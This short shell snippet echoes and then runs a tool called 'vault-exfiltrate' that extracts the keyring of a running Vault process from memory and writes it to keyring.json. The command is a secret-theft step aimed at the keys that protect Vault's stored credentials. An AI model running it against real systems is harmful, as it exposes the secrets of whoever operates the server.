echo "Execute ./vault-exfiltrate extract \$\(pidof vault\) keyring_binary | tee keyring.json"
./vault-exfiltrate extract $(pidof vault) keyring_binary | tee keyring.json
